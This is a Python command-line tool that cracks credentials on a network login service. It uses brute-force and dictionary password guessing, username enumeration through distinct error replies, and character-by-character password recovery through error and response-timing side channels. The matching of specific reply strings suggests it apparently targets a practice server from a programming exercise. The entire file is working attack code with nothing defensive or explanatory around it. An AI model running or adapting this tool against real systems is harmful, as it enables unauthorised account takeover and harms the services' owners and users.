import argparse
import socket
import itertools
import string
import json
import time


# Attempting to crack the password with the Brute Force method using a-z and 0-9 characters
def brute_force(client):
    characters = string.ascii_lowercase + string.digits
    for i in range(1, len(characters) + 1):
        for password in itertools.product(characters, repeat=i):
            client.send((''.join(password)).encode())
            response = client.recv(1024).decode()
            if response == 'Connection success!':
                return password
    return False


# Attempting to crack the password using the brute force method using a dictionary of the most popular passwords
def brute_force_dict(client):
    with open(r'passwords.txt', 'r') as f:
        for line in f:
            for x in itertools.product(*zip(line.strip().upper(), line.strip().lower())):
                password = ''.join(x)
                client.send(password.encode())
                response = client.recv(1024).decode()
                print(response)
                if response == 'Connection success!':
                    return password
    return False


# Attempting to crack a login with the brute force method using a dictionary of the most popular logins
def login_search(client):
    with open(r'logins.txt', 'r') as f:
        for line in f:
            for login in itertools.product(*zip(line.strip().upper(), line.strip().lower())):
                login = ''.join(login)
                x = {"login": login, "password": ""}
                x = json.dumps(x)
                client.send(x.encode())
                response = client.recv(1024).decode()
                response = json.loads(response)["result"]
                if response == "Wrong password!":
                    return login
    return False


# Attempt to crack the password by generating consecutive characters (based on server response time or "Exception
# happened during login" response in case of a valid character)
def password_search(client, login, max_n=1000):
    characters = string.printable
    password = ''
    n = 0
    while n < max_n:
        for i in characters:
            new_password = password + i
            x = {"login": login, "password": new_password}
            x = json.dumps(x)
            client.send(x.encode())
            time_1 = time.time()
            response = client.recv(1024).decode()
            time_2 = time.time()
            delta_time = time_2 - time_1
            response = json.loads(response)["result"]
            if response == "Exception happened during login":
                password += i
                continue
            elif delta_time > 0.1:
                password += i
                continue
            elif response == "Connection success!":
                password += i
                return password
        n += 1
    return False


# Create a socket and obtain login data
def get_response(address, method):
    with socket.socket() as client_socket:
        client_socket.connect(address)
        if method == 'brute force':
            password = brute_force(client_socket)
            if password:
                return password
        elif method == 'brute force with dict':
            password = brute_force_dict(client_socket)
            if password:
                return password
        elif method == 'login-and-password':
            login = login_search(client_socket)
            password = password_search(client_socket, login)
            if login and password:
                return login, password
    return False


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host')
    parser.add_argument('port')
    parser.add_argument('--method', default='login-and-password')
    args = parser.parse_args()
    response = get_response((args.host, int(args.port)), args.method)
    if response and args.method == 'login-and-password':
        print(json.dumps({"login": response[0], "password": response[1]}))
    elif response:
        print(response)
    else:
        print('Attempt failed!')


if __name__ == '__main__':
    main()
